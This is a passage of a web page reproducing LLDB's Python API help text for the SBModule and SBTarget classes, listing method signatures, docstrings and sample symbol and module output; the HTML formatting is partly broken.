print(sec)<br>|<br>|  And to iterate the symbols within a SBSection, use symbol_in_section_iter(),<br>|<br>|      # Iterates the text section and prints each symbols within each sub-section.<br>|      for subsec in text_sec:<br>|          print(INDENT + repr(subsec))<br>|          for sym in exe_module.symbol_in_section_iter(subsec):<br>|              print(INDENT2 + repr(sym))<br>|              print(INDENT2 + ‘symbol type: %s’ % symbol_type_to_str(sym.GetType()))<br>|<br>|  produces this following output:<br>|<br>|      [0x0000000100001780-0x0000000100001d5c) a.out.__TEXT.__text<br>|          id = {0x00000004}, name = ‘mask_access(MaskAction, unsigned int)’, range = [0x00000001000017c0-0x0000000100001870)<br>|          symbol type: code<br>|          id = {0x00000008}, name = 'thread_func(void</em>)’, range = [0x0000000100001870-0x00000001000019b0)<br>|          symbol type: code<br>|          id = {0x0000000c}, name = ‘main’, range = [0x00000001000019b0-0x0000000100001d5c)<br>|          symbol type: code<br>|          id = {0x00000023}, name = ‘start’, address = 0x0000000100001780<br>|          symbol type: code<br>|      [0x0000000100001d5c-0x0000000100001da4) a.out.__TEXT.__stubs<br>|          id = {0x00000024}, name = ‘__stack_chk_fail’, range = [0x0000000100001d5c-0x0000000100001d62)<br>|          symbol type: trampoline<br>|          id = {0x00000028}, name = ‘exit’, range = [0x0000000100001d62-0x0000000100001d68)<br>|          symbol type: trampoline<br>|          id = {0x00000029}, name = ‘fflush’, range = [0x0000000100001d68-0x0000000100001d6e)<br>|          symbol type: trampoline<br>|          id = {0x0000002a}, name = ‘fgets’, range = [0x0000000100001d6e-0x0000000100001d74)<br>|          symbol type: trampoline<br>|          id = {0x0000002b}, name = ‘printf’, range = [0x0000000100001d74-0x0000000100001d7a)<br>|          symbol type: trampoline<br>|          id = {0x0000002c}, name = ‘pthread_create’, range = [0x0000000100001d7a-0x0000000100001d80)<br>|          symbol type: trampoline<br>|          id = {0x0000002d}, name = ‘pthread_join’, range = [0x0000000100001d80-0x0000000100001d86)<br>|          symbol type: trampoline<br>|          id = {0x0000002e}, name = ‘pthread_mutex_lock’, range = [0x0000000100001d86-0x0000000100001d8c)<br>|          symbol type: trampoline<br>|          id = {0x0000002f}, name = ‘pthread_mutex_unlock’, range = [0x0000000100001d8c-0x0000000100001d92)<br>|          symbol type: trampoline<br>|          id = {0x00000030}, name = ‘rand’, range = [0x0000000100001d92-0x0000000100001d98)<br>|          symbol type: trampoline<br>|          id = {0x00000031}, name = ‘strtoul’, range = [0x0000000100001d98-0x0000000100001d9e)<br>|          symbol type: trampoline<br>|          id = {0x00000032}, name = ‘usleep’, range = [0x0000000100001d9e-0x0000000100001da4)<br>|          symbol type: trampoline<br>|      [0x0000000100001da4-0x0000000100001e2c) a.out.__TEXT.__stub_helper<br>|      [0x0000000100001e2c-0x0000000100001f10) a.out.__TEXT.__cstring<br>|      [0x0000000100001f10-0x0000000100001f68) a.out.__TEXT.__unwind_info<br>|      [0x0000000100001f68-0x0000000100001ff8) a.out.__TEXT.__eh_frame<br>|<br>|  Methods defined here:<br>|<br>|  Clear(self)<br>|      Clear(SBModule self)<br>|<br>|  FindCompileUnits(self, sb_file_spec)<br>|      FindCompileUnits(SBModule self, SBFileSpec sb_file_spec) -&gt; SBSymbolContextList<br>|<br>|<br>|      Find compile units related to *this module and passed source<br>|      file.<br>|<br>|      @param[in] sb_file_spec<br>|          A lldb::SBFileSpec object that contains source file<br>|          specification.<br>|<br>|      @return<br>|          A lldb::SBSymbolContextList that gets filled in with all of<br>|          the symbol contexts for all the matches.<br>|<br>|  FindFirstGlobalVariable(self, target, name)<br>|      FindFirstGlobalVariable(SBModule self, SBTarget target, str const * name) -&gt; SBValue<br>|<br>|<br>|      Find the first global (or static) variable by name.<br>|<br>|      @param[in] target<br>|          A valid SBTarget instance representing the debuggee.<br>|<br>|      @param[in] name<br>|          The name of the global or static variable we are looking<br>|          for.<br>|<br>|      @return<br>|          An SBValue that gets filled in with the found variable (if any).<br>|<br>|  FindFirstType(self, name)<br>|      FindFirstType(SBModule self, str const * name) -&gt; SBType<br>|<br>|  FindFunctions(self, *args)<br>|      FindFunctions(SBModule self, str const * name, uint32_t name_type_mask) -&gt; SBSymbolContextList<br>|      FindFunctions(SBModule self, str const * name) -&gt; SBSymbolContextList<br>|<br>|<br>|      Find functions by name.<br>|<br>|      @param[in] name<br>|          The name of the function we are looking for.<br>|<br>|      @param[in] name_type_mask<br>|          A logical OR of one or more FunctionNameType enum bits that<br>|          indicate what kind of names should be used when doing the<br>|          lookup. Bits include fully qualified names, base names,<br>|          C++ methods, or ObjC selectors.<br>|          See FunctionNameType for more details.<br>|<br>|      @return<br>|          A symbol context list that gets filled in with all of the<br>|          matches.<br>|<br>|  FindGlobalVariables(self, target, name, max_matches)<br>|      FindGlobalVariables(SBModule self, SBTarget target, str const * name, uint32_t max_matches) -&gt; SBValueList<br>|<br>|<br>|      Find global and static variables by name.<br>|<br>|      @param[in] target<br>|          A valid SBTarget instance representing the debuggee.<br>|<br>|      @param[in] name<br>|          The name of the global or static variable we are looking<br>|          for.<br>|<br>|      @param[in] max_matches<br>|          Allow the number of matches to be limited to max_matches.<br>|<br>|      @return<br>|          A list of matched variables in an SBValueList.<br>|<br>|  FindSection(self, sect_name)<br>|      FindSection(SBModule self, str const * sect_name) -&gt; SBSection<br>|<br>|  FindSymbol(self, *args)<br>|      FindSymbol(SBModule self, str const * name, lldb::SymbolType type) -&gt; SBSymbol<br>|      FindSymbol(SBModule self, str const * name) -&gt; SBSymbol<br>|<br>|  FindSymbols(self, *args)<br>|      FindSymbols(SBModule self, str const * name, lldb::SymbolType type) -&gt; SBSymbolContextList<br>|      FindSymbols(SBModule self, str const * name) -&gt; SBSymbolContextList<br>|<br>|  FindTypes(self, type)<br>|      FindTypes(SBModule self, str const * type) -&gt; SBTypeList<br>|<br>|  GetAddressByteSize(self)<br>|      GetAddressByteSize(SBModule self) -&gt; uint32_t<br>|<br>|  GetBasicType(self, type)<br>|      GetBasicType(SBModule self, lldb::BasicType type) -&gt; SBType<br>|<br>|  GetByteOrder(self)<br>|      GetByteOrder(SBModule self) -&gt; lldb::ByteOrder<br>|<br>|  GetCompileUnitAtIndex(self, arg2)<br>|      GetCompileUnitAtIndex(SBModule self, uint32_t arg2) -&gt; SBCompileUnit<br>|<br>|  GetDescription(self, description)<br>|      GetDescription(SBModule self, SBStream description) -&gt; bool<br>|<br>|  GetFileSpec(self)<br>|      GetFileSpec(SBModule self) -&gt; SBFileSpec<br>|<br>|<br>|      Get const accessor for the module file specification.<br>|<br>|      This function returns the file for the module on the host system<br>|      that is running LLDB. This can differ from the path on the<br>|      platform since we might be doing remote debugging.<br>|<br>|      @return<br>|          A const reference to the file specification object.<br>|<br>|  GetNumCompileUnits(self)<br>|      GetNumCompileUnits(SBModule self) -&gt; uint32_t<br>|<br>|  GetNumSections(self)<br>|      GetNumSections(SBModule self) -&gt; size_t<br>|<br>|  GetNumSymbols(self)<br>|      GetNumSymbols(SBModule self) -&gt; size_t<br>|<br>|  GetObjectFileEntryPointAddress(self)<br>|      GetObjectFileEntryPointAddress(SBModule self) -&gt; SBAddress<br>|<br>|  GetObjectFileHeaderAddress(self)<br>|      GetObjectFileHeaderAddress(SBModule self) -&gt; SBAddress<br>|<br>|  GetPlatformFileSpec(self)<br>|      GetPlatformFileSpec(SBModule self) -&gt; SBFileSpec<br>|<br>|<br>|      Get accessor for the module platform file specification.<br>|<br>|      Platform file refers to the path of the module as it is known on<br>|      the remote system on which it is being debugged. For local<br>|      debugging this is always the same as Module::GetFileSpec(). But<br>|      remote debugging might mention a file ‘/usr/lib/liba.dylib’<br>|      which might be locally downloaded and cached. In this case the<br>|      platform file could be something like:<br>|      ‘/tmp/lldb/platform-cache/remote.host.computer/usr/lib/liba.dylib’<br>|      The file could also be cached in a local developer kit directory.<br>|<br>|      @return<br>|          A const reference to the file specification object.<br>|<br>|  GetRemoteInstallFileSpec(self)<br>|      GetRemoteInstallFileSpec(SBModule self) -&gt; SBFileSpec<br>|<br>|  GetSectionAtIndex(self, idx)<br>|      GetSectionAtIndex(SBModule self, size_t idx) -&gt; SBSection<br>|<br>|  GetSymbolAtIndex(self, idx)<br>|      GetSymbolAtIndex(SBModule self, size_t idx) -&gt; SBSymbol<br>|<br>|  GetSymbolFileSpec(self)<br>|      GetSymbolFileSpec(SBModule self) -&gt; SBFileSpec<br>|<br>|  GetTriple(self)<br>|      GetTriple(SBModule self) -&gt; str const *<br>|<br>|  GetTypeByID(self, uid)<br>|      GetTypeByID(SBModule self, lldb::user_id_t uid) -&gt; SBType<br>|<br>|  GetTypes(self, *args)<br>|      GetTypes(SBModule self, uint32_t type_mask) -&gt; SBTypeList<br>|      GetTypes(SBModule self) -&gt; SBTypeList<br>|<br>|<br>|      Get all types matching type_mask from debug info in this<br>|      module.<br>|<br>|      @param[in] type_mask<br>|          A bitfield that consists of one or more bits logically OR’ed<br>|          together from the lldb::TypeClass enumeration. This allows<br>|          you to request only structure types, or only class, struct<br>|          and union types. Passing in lldb::eTypeClassAny will return<br>|          all types found in the debug information for this module.<br>|<br>|      @return<br>|          A list of types in this module that match type_mask<br>|<br>|  GetUUIDString(self)<br>|      GetUUIDString(SBModule self) -&gt; str const *<br>|<br>|      Returns the UUID of the module as a Python string.<br>|<br>|  GetVersion(self)<br>|      GetVersion(SBModule self) -&gt; uint32_t<br>|<br>|  IsTypeSystemCompatible(self, language)<br>|      IsTypeSystemCompatible(SBModule self, lldb::LanguageType language) -&gt; SBError<br>|<br>|  IsValid(self)<br>|      IsValid(SBModule self) -&gt; bool<br>|<br>|  ResolveFileAddress(self, vm_addr)<br>|      ResolveFileAddress(SBModule self, lldb::addr_t vm_addr) -&gt; SBAddress<br>|<br>|  ResolveSymbolContextForAddress(self, addr, resolve_scope)<br>|      ResolveSymbolContextForAddress(SBModule self, SBAddress addr, uint32_t resolve_scope) -&gt; SBSymbolContext<br>|<br>|  SetPlatformFileSpec(self, platform_file)<br>|      SetPlatformFileSpec(SBModule self, SBFileSpec platform_file) -&gt; bool<br>|<br>|  SetRemoteInstallFileSpec(self, file)<br>|      SetRemoteInstallFileSpec(SBModule self, SBFileSpec file) -&gt; bool<br>|<br>|  <strong>bool</strong> = <strong>nonzero</strong>(self)<br>|<br>|  <strong>del</strong> lambda self<br>|<br>|  <strong>eq</strong>(self, rhs)<br>|      Return self==value.<br>|<br>|  <strong>getattr</strong> lambda self, name<br>|<br>|  <strong>init</strong>(self, *args)<br>|      <strong>init</strong>(lldb::SBModule self) -&gt; SBModule<br>|      <strong>init</strong>(lldb::SBModule self, SBModule rhs) -&gt; SBModule<br>|      <strong>init</strong>(lldb::SBModule self, SBModuleSpec module_spec) -&gt; SBModule<br>|      <strong>init</strong>(lldb::SBModule self, SBProcess process, lldb::addr_t header_addr) -&gt; SBModule<br>|<br>|  <strong>iter</strong>(self)<br>|<br>|  <strong>len</strong>(self)<br>|<br>|  <strong>ne</strong>(self, rhs)<br>|      Return self!=value.<br>|<br>|  <strong>nonzero</strong>(self)<br>|<br>|  <strong>repr</strong> = _swig_repr(self)<br>|<br>|  <strong>setattr</strong> lambda self, name, value<br>|<br>|  <strong>str</strong>(self)<br>|      <strong>str</strong>(SBModule self) -&gt; PyObject *<br>|<br>|  compile_unit_iter(self)<br>|<br>|  get_compile_units_access_object(self)<br>|      An accessor function that returns a compile_units_access() object which allows lazy compile unit access from a lldb.SBModule object.<br>|<br>|  get_compile_units_array(self)<br>|      An accessor function that returns an array object that contains all compile_units in this module object.<br>|<br>|  get_sections_access_object(self)<br>|      An accessor function that returns a sections_access() object which allows lazy section array access.<br>|<br>|  get_sections_array(self)<br>|      An accessor function that returns an array object that contains all sections in this module object.<br>|<br>|  get_symbols_access_object(self)<br>|      An accessor function that returns a symbols_access() object which allows lazy symbol access from a lldb.SBModule object.<br>|<br>|  get_symbols_array(self)<br>|      An accessor function that returns a list() that contains all symbols in a lldb.SBModule object.<br>|<br>|  get_uuid(self)<br>|<br>|  section_iter(self)<br>|<br>|  symbol_in_section_iter(self, section)<br>|      Given a module and its contained section, returns an iterator on the<br>|      symbols within the section.</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>Static methods defined here:</td></tr><tr><td></td></tr><tr><td><strong>swig_destroy</strong> = delete_SBModule(…)</td></tr><tr><td>delete_SBModule(SBModule self)</td></tr><tr><td></td></tr><tr><td>----------------------------------------------------------------------</td></tr><tr><td>Data descriptors defined here:</td></tr><tr><td></td></tr><tr><td><strong>dict</strong></td></tr><tr><td>dictionary for instance variables (if defined)</td></tr><tr><td></td></tr><tr><td><strong>weakref</strong></td></tr><tr><td>list of weak references to the object (if defined)</td></tr><tr><td></td></tr><tr><td>addr_size</td></tr><tr><td>A read only property that returns the size in bytes of an address for this module.</td></tr><tr><td></td></tr><tr><td>byte_order</td></tr><tr><td>A read only property that returns an lldb enumeration value (lldb.eByteOrderLittle, lldb.eByteOrderBig, lldb.eByteOrderInvalid) that represents the byte order for this module.</td></tr><tr><td></td></tr><tr><td>compile_units</td></tr><tr><td>A read only property that returns a list() of lldb.SBCompileUnit objects contained in this module.</td></tr><tr><td></td></tr><tr><td>file</td></tr><tr><td>A read only property that returns an lldb object that represents the file (lldb.SBFileSpec) for this object file for this module as it is represented where it is being debugged.</td></tr><tr><td></td></tr><tr><td>num_sections</td></tr><tr><td>A read only property that returns number of sections in the module as an integer.</td></tr><tr><td></td></tr><tr><td>num_symbols</td></tr><tr><td>A read only property that returns number of symbols in the module symbol table as an integer.</td></tr><tr><td></td></tr><tr><td>platform_file</td></tr><tr><td>A read only property that returns an lldb object that represents the file (lldb.SBFileSpec) for this object file for this module as it is represented on the current host system.</td></tr><tr><td></td></tr><tr><td>section</td></tr><tr><td>A read only property that can be used to access compile units by index (“compile_unit = module.compile_unit[0]”), name (“compile_unit = module.compile_unit[‘main.cpp’]”), or using a regular expression (“compile_unit = module.compile_unit[re.compile(…)]”). The return value is a single lldb.SBCompileUnit object for array access or by full or partial path, and a list() of lldb.SBCompileUnit objects regular expressions.</td></tr><tr><td></td></tr><tr><td>sections</td></tr><tr><td>A read only property that returns a list() of lldb.SBSection objects contained in this module.</td></tr><tr><td></td></tr><tr><td>symbol</td></tr><tr><td>A read only property that can be used to access symbols by index (“symbol = module.symbol[0]”), name (“symbols = module.symbol[‘main’]”), or using a regular expression (“symbols = module.symbol[re.compile(…)]”). The return value is a single lldb.SBSymbol object for array access, and a list() of lldb.SBSymbol objects for name and regular expression access</td></tr><tr><td></td></tr><tr><td>symbols</td></tr><tr><td>A read only property that returns a list() of lldb.SBSymbol objects contained in this module.</td></tr><tr><td></td></tr><tr><td>triple</td></tr><tr><td>A read only property that returns the target triple (arch-vendor-os) for this module.</td></tr><tr><td></td></tr><tr><td>uuid</td></tr><tr><td>A read only property that returns a standard python uuid.UUID object that represents the UUID of this module.</td></tr><tr><td></td></tr><tr><td>----------------------------------------------------------------------</td></tr><tr><td>Data and other attributes defined here:</td></tr><tr><td></td></tr><tr><td><strong>hash</strong> = None</td></tr><tr><td></td></tr><tr><td><strong>swig_getmethods</strong> = {‘addr_size’: &lt;function SBModule.GetAddressByteS…</td></tr><tr><td></td></tr><tr><td><strong>swig_setmethods</strong> = {}</td></tr><tr><td></td></tr><tr><td>compile_units_access = &lt;class ‘lldb.SBModule.compile_units_access’&gt;</td></tr><tr><td></td></tr><tr><td></td></tr><tr><td>sections_access = &lt;class ‘lldb.SBModule.sections_access’&gt;</td></tr><tr><td></td></tr><tr><td></td></tr><tr><td>symbols_access = &lt;class ‘lldb.SBModule.symbols_access’&gt;</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#### SBTarget Python Help</span><br></pre></td></tr></table></figure><p>Help on SBTarget in module lldb object:</p><p>class SBTarget(builtins.object)<br>|  SBTarget(*args)<br>|<br>|  Represents the target program running under the debugger.<br>|<br>|  SBTarget supports module, breakpoint, and watchpoint iterations. For example,<br>|<br>|      for m in target.module_iter():<br>|          print m<br>|<br>|  produces:<br>|<br>|  (x86_64) /Volumes/data/lldb/svn/trunk/test/python_api/lldbutil/iter/a.out<br>|  (x86_64) /usr/lib/dyld<br>|  (x86_64) /usr/lib/libstdc++.6.dylib<br>|  (x86_64) /usr/lib/libSystem.B.dylib<br>|  (x86_64) /usr/lib/system/libmathCommon.A.dylib<br>|  (x86_64) /usr/lib/libSystem.B.dylib(__commpage)<br>|<br>|  and,<br>|<br>|      for b in target.breakpoint_iter():<br>|          print b<br>|<br>|  produces:<br>|<br>|  SBBreakpoint: id = 1, file =‘main.cpp’, line = 66, locations = 1<br>|  SBBreakpoint: id = 2, file =‘main.cpp’, line = 85, locations = 1<br>|<br>|  and,<br>|<br>|      for wp_loc in target.watchpoint_iter():<br>|          print wp_loc<br>|<br>|  produces:<br>|<br>|  Watchpoint 1: addr = 0x1034ca048 size = 4 state = enabled type = rw<br>|      declare @ ‘/Volumes/data/lldb/svn/trunk/test/python_api/watchpoint/main.c:12’<br>|      hw_index = 0  hit_count = 2     ignore_count = 0<br>|<br>|  Methods defined here:<br>|<br>|  AddModule(self, *args)<br>|      AddModule(SBTarget self, SBModule module) -&gt; bool<br>|      AddModule(SBTarget self, str const * path, str const * triple, str const * uuid) -&gt; SBModule<br>|      AddModule(SBTarget self, str const * path, str const * triple, str const * uuid_cstr, str const * symfile) -&gt; SBModule<br>|      AddModule(SBTarget self, SBModuleSpec module_spec) -&gt; SBModule<br>|<br>|  AppendImageSearchPath(self, arg2, to, error)<br>|      AppendImageSearchPath(SBTarget self, str const * arg2, str const * to, SBError error)<br>|<br>|<br>|      Append the path mapping (from -&gt; to) to the target’s paths mapping list.<br>|<br>|  Attach(self, attach_info, error)<br>|      Attach(SBTarget self, SBAttachInfo attach_info, SBError error) -&gt; SBProcess<br>|<br>|  AttachToProcessWithID(self, listener, pid, error)<br>|      AttachToProcessWithID(SBTarget self, SBListener listener, lldb::pid_t pid, SBError error) -&gt; SBProcess<br>|<br>|<br>|      Attach to process with pid.<br>|<br>|      @param[in] listener<br>|          An optional listener that will receive all process events.<br>|          If listener is valid then listener will listen to all<br>|          process events. If not valid, then this target’s debugger<br>|          (SBTarget::GetDebugger()) will listen to all process events.<br>|<br>|      @param[in] pid<br>|          The process ID to attach to.<br>|<br>|      @param[out]<br>|          An error explaining what went wrong if attach fails.<br>|<br>|      @return<br>|           A process object for the attached process.<br>|<br>|  AttachToProcessWithName(self, listener, name, wait_for, error)<br>|      AttachToProcessWithName(SBTarget self, SBListener listener, str const * name, bool wait_for, SBError error) -&gt; SBProcess<br>|<br>|<br>|      Attach to process with name.<br>|<br>|      @param[in] listener<br>|          An optional listener that will receive all process events.<br>|          If listener is valid then listener will listen to all<br>|          process events. If not valid, then this target’s debugger<br>|          (SBTarget::GetDebugger()) will listen to all process events.<br>|<br>|      @param[in] name<br>|          Basename of process to attach to.<br>|<br>|      @param[in] wait_for<br>|          If true wait for a new instance of ‘name’ to be launched.<br>|<br>|      @param[out]<br>|          An error explaining what went wrong if attach fails.<br>|<br>|      @return<br>|           A process object for the attached process.<br>|<br>|  BreakpointCreateByAddress(self, address)<br>|      BreakpointCreateByAddress(SBTarget self, lldb::addr_t address) -&gt; SBBreakpoint<br>|<br>|  BreakpointCreateByLocation(self, *args)<br>|      BreakpointCreateByLocation(SBTarget self, str const * file, uint32_t line) -&gt; SBBreakpoint<br>|      BreakpointCreateByLocation(SBTarget self, SBFileSpec file_spec, uint32_t line) -&gt; SBBreakpoint<br>|      BreakpointCreateByLocation(SBTarget self, SBFileSpec file_spec, uint32_t line, lldb::addr_t offset) -&gt; SBBreakpoint<br>|      BreakpointCreateByLocation(SBTarget self, SBFileSpec file_spec, uint32_t line, lldb::addr_t offset, SBFileSpecList module_list) -&gt; SBBreakpoint<br>|      BreakpointCreateByLocation(SBTarget self, SBFileSpec file_spec, uint32_t line, uint32_t column, lldb::addr_t offset, SBFileSpecList module_list) -&gt; SBBreakpoint<br>|<br>|  BreakpointCreateByName(self, *args)<br>|      BreakpointCreateByName(SBTarget self, str const * symbol_name, str const * module_name=None) -&gt; SBBreakpoint<br>|      BreakpointCreateByName(SBTarget self, str const * symbol_name) -&gt; SBBreakpoint<br>|      BreakpointCreateByName(SBTarget self, str const * symbol_name, uint32_t func_name_type, SBFileSpecList module_list, SBFileSpecList comp_unit_list) -&gt; SBBreakpoint<br>|      BreakpointCreateByName(SBTarget self, str const * symbol_name, uint32_t func_name_type, lldb::LanguageType symbol_language, SBFileSpecList module_list, SBFileSpecList comp_unit_list) -&gt; SBBreakpoint<br>|<br>|  BreakpointCreateByNames(self, *args)<br>|      BreakpointCreateByNames(SBTarget self, str const ** symbol_name, uint32_t name_type_mask, SBFileSpecList module_list, SBFileSpecList comp_unit_list) -&gt; SBBreakpoint<br>|      BreakpointCreateByNames(SBTarget self, str const ** symbol_name, uint32_t name_type_mask, lldb::LanguageType symbol_language, SBFileSpecList module_list, SBFileSpecList comp_unit_list) -&gt; SBBreakpoint<br>|      BreakpointCreateByNames(SBTarget self, str const ** symbol_name, uint32_t name_type_mask, lldb::LanguageType symbol_language, lldb::addr_t offset, SBFileSpecList module_list, SBFileSpecList comp_unit_list) -&gt; SBBreakpoint<br>|<br>|  BreakpointCreateByRegex(self, *args)<br>|      BreakpointCreateByRegex(SBTarget self, str const * symbol_name_regex, str const * module_name=None) -&gt; SBBreakpoint<br>|      BreakpointCreateByRegex(SBTarget self, str const * symbol_name_regex) -&gt; SBBreakpoint<br>|      BreakpointCreateByRegex(SBTarget self, str const * symbol_name_regex, lldb::LanguageType symbol_language, SBFileSpecList module_list, SBFileSpecList comp_unit_list) -&gt; SBBreakpoint<br>|<br>|  BreakpointCreateBySBAddress(self, sb_address)<br>|      BreakpointCreateBySBAddress(SBTarget self, SBAddress sb_address) -&gt; SBBreakpoint<br>|<br>|  BreakpointCreateBySourceRegex(self, *args)<br>|      BreakpointCreateBySourceRegex(SBTarget self, str const * source_regex, SBFileSpec source_file, str const * module_name=None) -&gt; SBBreakpoint<br>|      BreakpointCreateBySourceRegex(SBTarget self, str const * source_regex, SBFileSpec source_file) -&gt; SBBreakpoint<br>|      BreakpointCreateBySourceRegex(SBTarget self, str const * source_regex, SBFileSpecList module_list, SBFileSpecList file_list) -&gt; SBBreakpoint<br>|      BreakpointCreateBySourceRegex(SBTarget self, str const * source_regex, SBFileSpecList module_list, SBFileSpecList source_file, SBStringList func_names) -&gt; SBBreakpoint<br>|<br>|  BreakpointCreateForException(self, *args)<br>|      BreakpointCreateForException(SBTarget self, lldb::LanguageType language, bool catch_bp, bool throw_bp) -&gt; SBBreakpoint<br>|      BreakpointCreateForException(SBTarget self, lldb::LanguageType language, bool catch_bp, bool throw_bp, SBStringList extra_args) -&gt; SBBreakpoint<br>|<br>|  BreakpointCreateFromScript(self, class_name, extra_args, module_list, file_list, request_hardware=False)<br>|      BreakpointCreateFromScript(SBTarget self, str const * class_name, SBStructuredData extra_args, SBFileSpecList module_list, SBFileSpecList file_list, bool request_hardware=False) -&gt; SBBreakpoint<br>|      BreakpointCreateFromScript(SBTarget self, str const * class_name, SBStructuredData extra_args, SBFileSpecList module_list, SBFileSpecList file_list) -&gt; SBBreakpoint<br>|<br>|<br>|      Create a breakpoint using a scripted resolver.<br>|<br>|      @param[in] class_name<br>|         This is the name of the class that implements a scripted resolver.<br>|         The class should have the following signature:<br>|         class Resolver:<br>|             def <strong>init</strong>(self, bkpt, extra_args):<br>|                 # bkpt - the breakpoint for which this is the resolver.  When<br>|                 # the resolver finds an interesting address, call AddLocation<br>|                 # on this breakpoint to add it.<br>|                 #<br>|                 # extra_args - an SBStructuredData that can be used to<br>|                 # parametrize this instance.  Same as the extra_args passed<br>|                 # to BreakpointCreateFromScript.<br>|<br>|             def <strong>get_depth</strong> (self):<br>|                 # This is optional, but if defined, you should return the<br>|                 # depth at which you want the callback to be called.  The<br>|                 # available options are:<br>|                 #    lldb.eSearchDepthModule<br>|                 #    lldb.eSearchDepthCompUnit<br>|                 # The default if you don’t implement this method is<br>|                 # eSearchDepthModule.<br>|<br>|             def <strong>callback</strong>(self, sym_ctx):<br>|                 # sym_ctx - an SBSymbolContext that is the cursor in the<br>|                 # search through the program to resolve breakpoints.<br>|                 # The sym_ctx will be filled out to the depth requested in<br>|                 # <strong>get_depth</strong>.<br>|                 # Look in this sym_ctx for new breakpoint locations,<br>|                 # and if found use bkpt.AddLocation to add them.<br>|                 # Note, you will only get called for modules/compile_units that<br>|                 # pass the SearchFilter provided by the module_list &amp; file_list<br>|                 # passed into BreakpointCreateFromScript.<br>|<br>|             def get_short_help(self):<br>|                 # Optional, but if implemented return a short string that will<br>|                 # be printed at the beginning of the break list output for the<br>|                 # breakpoint.<br>|<br>|      @param[in] extra_args<br>|         This is an SBStructuredData object that will get passed to the<br>|         constructor of the class in class_name.  You can use this to<br>|         reuse the same class, parametrizing it with entries from this<br>|         dictionary.<br>|<br>|      @param module_list<br>|         If this is non-empty, this will be used as the module filter in the<br>|         SearchFilter created for this breakpoint.<br>|<br>|      @param file_list<br>|         If this is non-empty, this will be used as the comp unit filter in the<br>|         SearchFilter created for this breakpoint.<br>|<br>|      @return<br>|          An SBBreakpoint that will set locations based on the logic in the<br>|          resolver’s search callback.<br>|<br>|  BreakpointDelete(self, break_id)<br>|      BreakpointDelete(SBTarget self, lldb::break_id_t break_id) -&gt; bool<br>|<br>|  BreakpointsCreateFromFile(self, *args)<br>|      BreakpointsCreateFromFile(SBTarget self, SBFileSpec source_file, SBBreakpointList bkpt_list) -&gt; SBError<br>|      BreakpointsCreateFromFile(SBTarget self, SBFileSpec source_file, SBStringList matching_names, SBBreakpointList new_bps) -&gt; SBError<br>|<br>|<br>|      Read breakpoints from source_file and return the newly created<br>|      breakpoints in bkpt_list.<br>|<br>|      @param[in] source_file<br>|         The file from which to read the breakpoints<br>|<br>|      @param[in] matching_names<br>|         Only read in breakpoints whose names match one of the names in this<br>|         list.<br>|<br>|      @param[out] bkpt_list<br>|         A list of the newly created breakpoints.<br>|<br>|      @return<br>|          An SBError detailing any errors in reading in the breakpoints.<br>|<br>|  BreakpointsWriteToFile(self, *args)<br>|      BreakpointsWriteToFile(SBTarget self, SBFileSpec dest_file) -&gt; SBError<br>|      BreakpointsWriteToFile(SBTarget self, SBFileSpec dest_file, SBBreakpointList bkpt_list, bool append=False) -&gt; SBError<br>|      BreakpointsWriteToFile(SBTarget self, SBFileSpec dest_file, SBBreakpointList bkpt_list) -&gt; SBError<br>|<br>|  Clear(self)<br>|      Clear(SBTarget self)<br>|<br>|  ClearModuleLoadAddress(self, module)<br>|      ClearModuleLoadAddress(SBTarget self, SBModule module) -&gt; SBError<br>|<br>|  ClearSectionLoadAddress(self, section)<br>|      ClearSectionLoadAddress(SBTarget self, SBSection section) -&gt; SBError<br>|<br>|  ConnectRemote(self, listener, url, plugin_name, error)<br>|      ConnectRemote(SBTarget self, SBListener listener, str const * url, str const * plugin_name, SBError error) -&gt; SBProcess<br>|<br>|<br>|      Connect to a remote debug server with url.<br>|<br>|      @param[in] listener<br>|          An optional listener that will receive all process events.<br>|          If listener is valid then listener will listen to all<br>|          process events. If not valid, then this target’s debugger<br>|          (SBTarget::GetDebugger()) will listen to all process events.<br>|<br>|      @param[in] url<br>|          The url to connect to, e.g., ‘connect://localhost:12345’.<br>|<br>|      @param[in] plugin_name<br>|          The plugin name to be used; can be NULL.<br>|<br>|      @param[out]<br>|          An error explaining what went wrong if the connect fails.<br>|<br>|      @return<br>|           A process object for the connected process.<br>|<br>|  CreateValueFromAddress(self, name, addr, type)<br>|      CreateValueFromAddress(SBTarget self, str const * name, SBAddress addr, SBType type) -&gt; SBValue<br>|<br>|<br>|      Create an SBValue with the given name by treating the memory starting at addr as an entity of type.<br>|<br>|      @param[in] name<br>|          The name of the resultant SBValue<br>|<br>|      @param[in] addr<br>|          The address of the start of the memory region to be used.<br>|<br>|      @param[in] type<br>|          The type to use to interpret the memory starting at addr.<br>|<br>|      @return<br>|          An SBValue of the given type, may be invalid if there was an error reading<br>|          the underlying memory.<br>|<br>|  CreateValueFromData(self, name, data, type)<br>|      CreateValueFromData(SBTarget self, str const * name, SBData data, SBType type) -&gt; SBValue<br>|<br>|  CreateValueFromExpression(self, name, expr)<br>|      CreateValueFromExpression(SBTarget self, str const * name, str const * expr) -&gt; SBValue<br>|<br>|  DeleteAllBreakpoints(self)<br>|      DeleteAllBreakpoints(SBTarget self) -&gt; bool<br>|<br>|  DeleteAllWatchpoints(self)<br>|      DeleteAllWatchpoints(SBTarget self) -&gt; bool<br>|<br>|  DeleteBreakpointName(self, name)<br>|      DeleteBreakpointName(SBTarget self, str const * name)<br>|<br>|  DeleteWatchpoint(self, watch_id)<br>|      DeleteWatchpoint(SBTarget self, lldb::watch_id_t watch_id) -&gt; bool<br>|<br>|  DisableAllBreakpoints(self)<br>|      DisableAllBreakpoints(SBTarget self) -&gt; bool<br>|<br>|  DisableAllWatchpoints(self)<br>|      DisableAllWatchpoints(SBTarget self) -&gt; bool<br>|<br>|  EnableAllBreakpoints(self)<br>|      EnableAllBreakpoints(SBTarget self) -&gt; bool<br>|<br>|  EnableAllWatchpoints(self)<br>|      EnableAllWatchpoints(SBTarget self) -&gt; bool<br>|<br>|  EvaluateExpression(self, *args)<br>|      EvaluateExpression(SBTarget self, str const * expr) -&gt; SBValue<br>|      EvaluateExpression(SBTarget self, str const * expr, SBExpressionOptions options) -&gt; SBValue<br>|<br>|  FindBreakpointByID(self, break_id)<br>|      FindBreakpointByID(SBTarget self, lldb::break_id_t break_id) -&gt; SBBreakpoint<br>|<br>|  